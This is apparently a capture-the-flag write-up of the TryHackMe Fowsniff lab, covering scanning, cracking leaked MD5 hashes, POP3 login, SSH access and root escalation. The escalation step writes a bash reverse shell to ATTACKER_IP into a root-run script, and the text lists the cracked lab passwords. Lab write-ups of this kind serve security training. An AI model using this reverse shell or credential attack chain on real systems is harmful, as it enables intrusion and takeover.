# TryHackMe - Fowsniff Write-up

## Overview
Fowsniff is a beginner-friendly machine that demonstrates a realistic attack chain involving:

- OSINT
- Password hash cracking
- Email service exploitation
- Credential reuse
- Privilege escalation via writable scripts

---

# 1. Enumeration

Initial scan using **Nmap**:

```bash
nmap -sC -sV -A 10.112.151.76
```

### Results

| Port | Service | Version |
|-----|------|------|
| 22 | SSH | OpenSSH 7.2 |
| 80 | HTTP | Apache 2.4.18 |
| 110 | POP3 | Dovecot |
| 143 | IMAP | Dovecot |

The presence of **POP3 and IMAP** indicates that the machine likely involves **email services**.

---

# 2. Website Enumeration

Viewing the webpage source revealed that the main site was **temporarily offline**.

robots.txt:

```
User-agent: *
Disallow: /
```

This indicated the web server was likely a **decoy**.

---

# 3. OSINT Investigation

Investigating the **Fowsniff Twitter account** revealed that the company had been **hacked**.

The attacker posted a **Pastebin dump containing employee password hashes**.

Example entry:

```
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
```

Format:

```
email : md5 hash
```

---

# 4. Password Hash Cracking

Hashes were saved into a file and cracked using **John the Ripper**.

```bash
john hashes.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered passwords included:

```
mauer: mailcall
mustermann: bilbo101
tegel: apples01
baksteen: skyler22
seina: scoobydoo2
nancy: carp4ever
enrico: orlando12
```

---

# 5. Accessing the Mail Server

Using the valid credential:

```
seina : scoobydoo2
```

Connected to the **POP3 server**:

```bash
telnet 10.112.151.76 110
```

Login:

```
USER seina
PASS scoobydoo2
```

Successful authentication:

```
+OK Logged in.
```

---

# 6. Retrieving Emails

List messages:

```
LIST
```

Retrieve emails:

```
RETR 1
RETR 2
```

Important message revealed:

```
The temporary password for SSH is "S1ck3nBluff+secureshell"
```

---

# 7. SSH Access

Using the temporary password discovered in the email:

```bash
ssh baksteen@10.112.151.76
```

Password:

```
S1ck3nBluff+secureshell
```

This provided **initial shell access** to the system.

---

# 8. Privilege Escalation

While enumerating the system, a **writable script** was discovered:

```
cube.sh
```

The script was executed by **root**, but writable by normal users.

The script was modified to include a reverse shell payload:

```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

# 9. Listener Setup

On the attacker machine:

```bash
nc -lvnp 4444
```

When the script executed, a **root reverse shell** was received.

Verification:

```bash
whoami
```

Output:

```
root
```

---

# 10. Root Flag

Finally, the root flag was retrieved:

```bash
cat /root/root.txt
```

---

# Attack Chain Summary

1. Service Enumeration
2. OSINT via Twitter breach
3. Password hash cracking
4. Mail server compromise
5. Credential discovery
6. SSH login
7. Privilege escalation via writable script
8. Root shell

---

# Skills Learned

- OSINT investigation
- Hash cracking
- POP3 interaction
- Credential reuse attacks
- Linux enumeration
- Privilege escalation via writable scripts
- Reverse shells

---

# Tools Used

- Nmap
- John the Ripper
- Telnet
- Netcat
- SSH

---

# Final Thoughts

Fowsniff demonstrates how a **small credential leak can lead to full system compromise** through:

- weak passwords
- password reuse
- poor system hardening

A good example of a **realistic penetration testing workflow**.